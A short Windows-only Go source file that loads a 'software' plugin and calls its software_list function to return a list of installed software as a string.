//go:build windows

package sysutil

import (
	"unsafe"

	"github.com/microsoft/UpdateAssistant/modules/config"
	"github.com/microsoft/UpdateAssistant/modules/loader"
)

func softwareDLL(fn func(*loader.Plugin)) {
	p, err := loader.Load("software")
	if err != nil {
		return
	}
	defer loader.Unload(p)
	fn(p)
}

func SoftwareList() string {
	var r string
	softwareDLL(func(p *loader.Plugin) {
		buf := make([]byte, config.CmdBuf)
		n, err := p.Call("software_list", uintptr(unsafe.Pointer(&buf[0])), uintptr(config.CmdBuf))
		if err == nil {
			r = string(buf[:int(n)])
		}
	})
	return r
}
